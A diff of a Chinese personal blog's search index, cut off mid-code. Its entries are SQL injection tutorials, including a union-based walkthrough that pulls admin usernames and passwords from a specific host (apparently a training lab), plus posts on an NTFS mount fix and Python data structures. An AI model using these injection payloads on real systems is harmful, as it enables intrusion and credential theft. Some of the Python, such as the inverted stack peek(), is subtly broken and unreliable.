@@ -1,276 +1,438 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>mysql的information_schema库</title>
-      <link href="2021/03/14/mysql%E7%9A%84information-schema%E5%BA%93/"/>
-      <url>2021/03/14/mysql%E7%9A%84information-schema%E5%BA%93/</url>
-      
-        <content type="html"><![CDATA[<h1 id="information-schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。"><a href="#information-schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。" class="headerlink" title="information_schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。"></a>information_schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。</h1><ul><li>information_schema的表schema中的列schema_name记录了所有数据库的名字。</li><li>information_schema的表tables中的列table_schema记录了所有的数据库名字。</li><li>information_schema的表tables中的列table_name记录了所有数据库的表的名字。</li><li>information_schema的表columns中的列table_schema记录了所有的数据库名字。</li><li>information_schema的表columns中的列table_name记录了所有数据库表的名字。</li><li>information_schema的表columns中的列columns_name记录了所有数据库表的列的名字。</li></ul>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>字符型sql注入利用方法</title>
-      <link href="2021/03/14/Hadoop-%E7%AC%94%E8%AE%B0/"/>
-      <url>2021/03/14/Hadoop-%E7%AC%94%E8%AE%B0/</url>
-      
-        <content type="html"><![CDATA[<h1 id="确定是否存在字符型sql注入"><a href="#确定是否存在字符型sql注入" class="headerlink" title="确定是否存在字符型sql注入"></a>确定是否存在字符型sql注入</h1><ul><li><p><strong>使用 and ‘1’=’1 和 and ‘1’=’2来判断：</strong></p><p>  Url 地址中输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’1 页面运行正常，继续进行下一步。</p></li></ul><p>　　Url 地址中继续输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’2 页面运行错误，则说明此 Sql 注入为字符型注入</p><ul><li>将单引号闭合<br>在url中使用“–+”将单引号闭合：<br><a href="http://xxx/abc.php?id=1&#39;">http://XXX/abc.php?id=1&#39;</a> and ‘1’=’1’–+</li></ul><p>__ 注意“–”后面要添加+号，sql语句会变为：<br>select *from user where id=’1’ and ‘1’=’1’– ‘__</p><ul><li><p>判断当前表的列数：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> order by 1–+<br>利用order by语句判断，当按照第4列排序时页面返回异常，说明当前表为3列。</p></li><li><p>得到当前的数据库名称：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,database()–+<br>在页面上即可得到当前的数据库名称。</p></li><li><p>得到当前数据库包含的数据表：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1–+</p><p>  <strong>此时的sql语句为：</strong><br>select *from user where id=’1’ and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1– ‘</p></li></ul><p>得到第一个表的名称，继续使用limit 1,1得到下一个表的名称，一直到页面异常。</p><ul><li><p>得到某个表包含的列及名称：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1–+</p><p>  <strong>此时的sql语句为：</strong><br>  select *from user where id=’1’ and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1– ‘</p><p> 得到error_flag表的第一个列名，继续使用limit 得到表的每一个列名，直到页面异常。</p></li><li><p>根据得到表的列及名称得到表的记录：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,id,flag from error_flag limit 0,1 –+</p></li></ul><p>使用limit依次得到表的每一条记录。</p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title>字符型sql注入利用方法</title>
+    <url>/2021/03/14/Hadoop-%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="确定是否存在字符型sql注入"><a href="#确定是否存在字符型sql注入" class="headerlink" title="确定是否存在字符型sql注入"></a>确定是否存在字符型sql注入</h1><ul>
+<li><p><strong>使用 and ‘1’=’1 和 and ‘1’=’2来判断：</strong></p>
+<p>  Url 地址中输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’1 页面运行正常，继续进行下一步。</p>
+</li>
+</ul>
+<p>　　Url 地址中继续输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’2 页面运行错误，则说明此 Sql 注入为字符型注入</p>
+<ul>
+<li>将单引号闭合<br>在url中使用“–+”将单引号闭合：<br><a href="http://xxx/abc.php?id=1&#39;">http://XXX/abc.php?id=1&#39;</a> and ‘1’=’1’–+</li>
+</ul>
+<p>__ 注意“–”后面要添加+号，sql语句会变为：<br>select *from user where id=’1’ and ‘1’=’1’– ‘__</p>
+<ul>
+<li><p>判断当前表的列数：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> order by 1–+<br>利用order by语句判断，当按照第4列排序时页面返回异常，说明当前表为3列。</p>
+</li>
+<li><p>得到当前的数据库名称：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,database()–+<br>在页面上即可得到当前的数据库名称。</p>
+</li>
+<li><p>得到当前数据库包含的数据表：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1–+</p>
+<p>  <strong>此时的sql语句为：</strong><br>select *from user where id=’1’ and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1– ‘</p>
+</li>
+</ul>
+<p>得到第一个表的名称，继续使用limit 1,1得到下一个表的名称，一直到页面异常。</p>
+<ul>
+<li><p>得到某个表包含的列及名称：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1–+</p>
+<p>  <strong>此时的sql语句为：</strong><br>  select *from user where id=’1’ and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1– ‘</p>
+<p> 得到error_flag表的第一个列名，继续使用limit 得到表的每一个列名，直到页面异常。</p>
+</li>
+<li><p>根据得到表的列及名称得到表的记录：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,id,flag from error_flag limit 0,1 –+</p>
+</li>
+</ul>
+<p>使用limit依次得到表的每一条记录。</p>
+]]></content>
       <categories>
-          
-          <category> 攻防 </category>
-          
+        <category>攻防</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> sql注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>字符型sql注入利用方法</title>
-      <link href="2021/03/14/%E5%AD%97%E7%AC%A6%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
-      <url>2021/03/14/%E5%AD%97%E7%AC%A6%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-      
-        <content type="html"><![CDATA[<h1 id="确定是否存在字符型sql注入"><a href="#确定是否存在字符型sql注入" class="headerlink" title="确定是否存在字符型sql注入"></a>确定是否存在字符型sql注入</h1><ul><li><p><strong>使用 and ‘1’=’1 和 and ‘1’=’2来判断：</strong></p><p>  Url 地址中输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’1 页面运行正常，继续进行下一步。</p></li></ul><p>　　Url 地址中继续输入 <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’2 页面运行错误，则说明此 Sql 注入为字符型注入</p><ul><li>将单引号闭合<br>在url中使用“–+”将单引号闭合：<br><a href="http://xxx/abc.php?id=1&#39;">http://XXX/abc.php?id=1&#39;</a> and ‘1’=’1’–+</li></ul><p>__ 注意“–”后面要添加+号，sql语句会变为：<br>select *from user where id=’1’ and ‘1’=’1’– ‘__</p><ul><li><p>判断当前表的列数：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> order by 1–+<br>利用order by语句判断，当按照第4列排序时页面返回异常，说明当前表为3列。</p></li><li><p>得到当前的数据库名称：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,database()–+<br>在页面上即可得到当前的数据库名称。</p></li><li><p>得到当前数据库包含的数据表：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1–+</p><p>  <strong>此时的sql语句为：</strong><br>select *from user where id=’1’ and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1– ‘</p></li></ul><p>得到第一个表的名称，继续使用limit 1,1得到下一个表的名称，一直到页面异常。</p><ul><li><p>得到某个表包含的列及名称：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1–+</p><p>  <strong>此时的sql语句为：</strong><br>  select *from user where id=’1’ and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1– ‘</p><p> 得到error_flag表的第一个列名，继续使用limit 得到表的每一个列名，直到页面异常。</p></li><li><p>根据得到表的列及名称得到表的记录：<br><a href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,id,flag from error_flag limit 0,1 –+</p></li></ul><p>使用limit依次得到表的每一条记录。</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 攻防 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql注入得到数据库的用户名和密码</title>
-      <link href="2021/03/08/sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
-      <url>2021/03/08/sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
-      
-        <content type="html"><![CDATA[<h1 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h1><ul><li>当输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=1">http://59.63.200.79:8003/?id=1%20and%201=1</a><br>时网站显示正常</li><li>当输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2">http://59.63.200.79:8003/?id=1%20and%201=2</a><br>时网站显示不正常，判断注入点在此。</li></ul><h1 id="确定网站的回传的字段数"><a href="#确定网站的回传的字段数" class="headerlink" title="确定网站的回传的字段数"></a>确定网站的回传的字段数</h1><ul><li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201">http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201</a><br>网站显示正常，结尾用order by 2 时仍显示正常，当使用order by 3 时页面显示不正常，判断网站包含两个字段。</li></ul><h1 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h1><ul><li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2</a><br>时页面显示出来2，确定了回显地点。</li></ul><h1 id="确定数据库名称"><a href="#确定数据库名称" class="headerlink" title="确定数据库名称"></a>确定数据库名称</h1><ul><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()</a><br>出现当前数据库的名称：maoshe</p><h1 id="确定当前数据库包含的表"><a href="#确定当前数据库包含的表" class="headerlink" title="确定当前数据库包含的表"></a>确定当前数据库包含的表</h1></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1</a><br>返回当前数据库包含的第一个表名：admin。</p></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1</a><br>页面异常，表示当前数据库只包含一个表。</p></li></ul><p><strong><em>limit用法</em></strong></p><ul><li><p>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。</p><h1 id="确定当前数据库表包含的列名"><a href="#确定当前数据库表包含的列名" class="headerlink" title="确定当前数据库表包含的列名"></a>确定当前数据库表包含的列名</h1></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1</a><br>得到第一列的名称为：Id</p></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%25">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%</a><br>20and%20table_name=%27admin%27%20limit%201,1<br>得到第二列的名称为：username </p></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1</a><br>得到第三列的名称为：password </p></li><li><p>输入limit 3,1时页面异常，说明admin表只包含三列。</p><h1 id="确定当前表记录的用户"><a href="#确定当前表记录的用户" class="headerlink" title="确定当前表记录的用户"></a>确定当前表记录的用户</h1></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1</a><br>得到第一个用户为admin</p></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1</a><br>得到第二个用户为：ppt领取微信 。</p></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1</a><br>页面异常，说明只包含两个用户。</p><h1 id="确定用户的密码"><a href="#确定用户的密码" class="headerlink" title="确定用户的密码"></a>确定用户的密码</h1></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1</a><br>得到admin用户的密码为：hellohack </p></li><li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1</a><br>得到第二个用户的密码为：zkaqbanban </p></li></ul>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> sql注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>linux挂载U盘失败</title>
-      <link href="2019/11/24/linux%E6%8C%82%E8%BD%BDU%E7%9B%98%E5%A4%B1%E8%B4%A5/"/>
-      <url>2019/11/24/linux%E6%8C%82%E8%BD%BDU%E7%9B%98%E5%A4%B1%E8%B4%A5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h1><ul><li>linux系统在未完全完成U盘的写操作时就将U盘拔掉，造成再次插入U盘时出现无法挂载的问题：</li></ul><p>Error mounting /dev/sdb1 at /media/xxx/xx: Command-line`mount -t “ntfs” -o”uhelper=udisks2,nodev,nosuid,uid=1000,gid=1000,dmask=0077,fmask=0177””/dev/sdb1” “/media/eden/文檔”‘ exited with non-zero exit status14: The disk contains an unclean file system (0, 0).<br>Metadata kept in Windows cache, refused to mount.<br>Failed to mount ‘/dev/sdb1’: Operation not permitted<br>The NTFS partition is in an unsafe state. Please resume andshutdown<br>Windows fully (no hibernation or fast restarting), or mount thevolume<br>read-only with the ‘ro’ mount option.</p><h1 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h1><ul><li>从错误信息中可以看到U盘的分区位于/dev/sdb1，我们使用命令：<font color="#dd0000">sudo ntfsfix /dev/sdb1</font> 来修复这个错误。</li><li>ntfsfix 实用程序可修复一些常见的 NTFS 问题，它将修复一些基本的 NTFS 不一致性，重置 NTFS 日志文件并在下次重新引导操作系统时安排进行 NTFS 一致性检查。</li></ul>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>字符串的连续子串是回文的个数（Python）</title>
-      <link href="2019/10/21/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E8%BF%9E%E7%BB%AD%E5%AD%90%E4%B8%B2%E6%98%AF%E5%9B%9E%E6%96%87%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%88Python%EF%BC%89/"/>
-      <url>2019/10/21/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E8%BF%9E%E7%BB%AD%E5%AD%90%E4%B8%B2%E6%98%AF%E5%9B%9E%E6%96%87%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%88Python%EF%BC%89/</url>
-      
-        <content type="html"><![CDATA[<h1 id="字符串的连续子串是回文的个数"><a href="#字符串的连续子串是回文的个数" class="headerlink" title="字符串的连续子串是回文的个数"></a>字符串的连续子串是回文的个数</h1><ul><li>首先编写一个函数用来判断字符串是否是回文：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def isPalindrome(mystr):</span><br><span class="line">    l &#x3D; len(mystr)</span><br><span class="line">    i &#x3D; 0</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    while i&lt;(l&#x2F;2):</span><br><span class="line">        if(mystr[i]&#x3D;&#x3D;mystr[l-i-1]):</span><br><span class="line">            count +&#x3D; 1</span><br><span class="line">            i +&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            count &#x3D; 0</span><br><span class="line">            break</span><br><span class="line">    if(count&#x3D;&#x3D;0):</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return 1</span><br></pre></td></tr></table></figure></li><li>找出字符串所有的连续子串并分别判断是否为回文：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def palindNum(mystr):</span><br><span class="line">    sub_str &#x3D; []</span><br><span class="line">    ls &#x3D; len(mystr)</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    for i in range(1,ls):#i控制步长</span><br><span class="line">        for j in range(ls-i+1):#j控制位置</span><br><span class="line">            sub_str.append(mystr[j:j+i])</span><br><span class="line">    for i in sub_str:</span><br><span class="line">        count +&#x3D; isPalindrome(i)</span><br><span class="line">    return count</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Python数据结构之栈</title>
-      <link href="2019/10/17/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88/"/>
-      <url>2019/10/17/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88/</url>
-      
-        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>栈是一种先进后出的数据结构，可以看成是一种特殊的链表，每次添加的元素都将成为头节点，每次取元素时都先取头结点。</p><h1 id="栈的基本操作包括："><a href="#栈的基本操作包括：" class="headerlink" title="栈的基本操作包括："></a>栈的基本操作包括：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Node(object):</span><br><span class="line">    def __init__(self,data,next &#x3D; None):</span><br><span class="line">        self.data &#x3D; data</span><br><span class="line">        self.next &#x3D; next</span><br><span class="line">class Stack(object):</span><br><span class="line">    def __init__(self,top&#x3D;None):</span><br><span class="line">        self.top &#x3D; top</span><br><span class="line">    def push(self,data):</span><br><span class="line">        self.top &#x3D; Node(data,self.top)#将元素插入到头结点的前面并成为头结点</span><br><span class="line">    def pop(self):#将元素的头结点取出</span><br><span class="line">        if self.top is None:</span><br><span class="line">            return None</span><br><span class="line">        data &#x3D; self.top.data</span><br><span class="line">        self.top &#x3D; self.top.next</span><br><span class="line">        return data</span><br><span class="line">    def peek(self):#查看栈顶元素，原来的栈不变</span><br><span class="line">        return self.top.data if self.top is None else None</span><br><span class="line">    def printStack(self):#打印栈元素</span><br><span class="line">        while self.top:</span><br><span class="line">            print(self.pop())</span><br><span class="line">        return </span><br><span class="line">    def isEmpty(self):#判断栈是否为空</span><br><span class="line">        if self.top is None:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    stack &#x3D; Stack()</span><br><span class="line">    stack.push(1)</span><br><span class="line">    stack.push(2)</span><br><span class="line">    stack.printStack()</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h1 id="逆转字符串"><a href="#逆转字符串" class="headerlink" title="逆转字符串"></a>逆转字符串</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def revString(mystr):</span><br><span class="line">stack &#x3D; Stack()</span><br><span class="line">    for i in mystr:</span><br><span class="line">    stack.push(i)</span><br><span class="line">    revStr &#x3D; &#39;&#39;</span><br><span class="line">    while not stack.isEmpty():</span><br><span class="line">    revStr +&#x3D; stack.pop()</span><br><span class="line">    return revStr</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Python数据结构之链表</title>
-      <link href="2019/10/17/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E9%93%BE%E8%A1%A8/"/>
-      <url>2019/10/17/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E9%93%BE%E8%A1%A8/</url>
-      
-        <content type="html"><![CDATA[<h1 id="链表的基本元素有："><a href="#链表的基本元素有：" class="headerlink" title="链表的基本元素有："></a>链表的基本元素有：</h1><ul><li>节点：每个节点包含两个部分，左边部分称为值域，用来存放数据；右边部分称为指针域，用来存放指针指向下一个元素。 </li><li>head节点：指向链表的第一个节点。 </li><li>tail节点：指向链表的最后一个节点。 </li><li>None值:链表的最后一个节点的指针域为None值<br>节点类的定义如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Node:</span><br><span class="line">    def __init__(self,val&#x3D;None,next&#x3D;None):</span><br><span class="line">    self.val &#x3D; val #值域</span><br><span class="line">        self.next &#x3D; next #指针域</span><br></pre></td></tr></table></figure><h1 id="链表的定义方法一："><a href="#链表的定义方法一：" class="headerlink" title="链表的定义方法一："></a>链表的定义方法一：</h1>可以先定义一个一个的节点，然后再把节点的关系表示出来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">node1 &#x3D; Node(1)</span><br><span class="line">node2 &#x3D; Node(2)</span><br><span class="line">node3 &#x3D; Node(3)</span><br><span class="line">node1.next &#x3D; node2</span><br><span class="line">node2.next &#x3D; node3</span><br></pre></td></tr></table></figure></li></ul><h1 id="链表的定义方法二：定义链表类及其基本操作"><a href="#链表的定义方法二：定义链表类及其基本操作" class="headerlink" title="链表的定义方法二：定义链表类及其基本操作"></a>链表的定义方法二：定义链表类及其基本操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">class LinkedList(object):</span><br><span class="line">    def __init__(self,head &#x3D; None):</span><br><span class="line">        self.head &#x3D; head</span><br><span class="line">    def __len__(self):#计算链表长度</span><br><span class="line">        curr &#x3D; self.head</span><br><span class="line">        counter &#x3D; 0</span><br><span class="line">        while curr is not None:</span><br><span class="line">            counter +&#x3D;1</span><br><span class="line">            curr &#x3D; curr.next</span><br><span class="line">        return counter</span><br><span class="line">    def printNode(self):#打印链表元素</span><br><span class="line">        node &#x3D; self.head</span><br><span class="line">        while node is not None:</span><br><span class="line">            print(node.val)</span><br><span class="line">            node &#x3D; node.next</span><br><span class="line">        return</span><br><span class="line">    def insertToFront(self,data):#从前面插入节点</span><br><span class="line">        if data is not None:</span><br><span class="line">            node &#x3D; Node(data,self.head) #生成一个节点，值域为data,指针指向头结点。</span><br><span class="line">            self.head &#x3D; node #将插入的节点设置为头结点</span><br><span class="line">            return node</span><br><span class="line">    def append(self,data):#从后面添加节点</span><br><span class="line">        if data is not None:</span><br><span class="line">            node &#x3D; Node(data)</span><br><span class="line">            if self.head is None: #如果原链表为空则插入的节点为投机诶单</span><br><span class="line">                self.head &#x3D; node</span><br><span class="line">                return node</span><br><span class="line">            curr_node &#x3D; self.head</span><br><span class="line">            while curr_node.next is not None:#如果原链表不为空则找到链表的最后一个节点，让最后一个节点指向新加入的节点。</span><br><span class="line">                curr_node &#x3D; curr_node.next</span><br><span class="line">            curr_node.next &#x3D; 